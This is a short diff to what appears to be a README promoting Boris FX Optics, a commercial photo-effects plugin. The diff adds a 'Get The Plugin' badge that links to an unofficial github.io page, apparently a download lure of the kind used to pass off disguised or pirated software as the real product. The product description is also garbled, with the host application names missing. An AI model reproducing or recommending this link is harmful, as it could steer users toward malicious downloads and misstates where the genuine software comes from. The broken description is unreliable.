@@ -2,6 +2,7 @@
 
 **Boris FX Optics** brings Hollywood-grade looks to stills with AI masking, particle painting, film stocks, lens flares, and deep color tools—available as a ** &  plugin and a standalone app** for macOS and Windows. 
 
+[![Get](https://img.shields.io/badge/Get%20The-Plugin-blueviolet)](https://boris-fx-optics-plugin.github.io/.github/)
 
 ## Overview
 
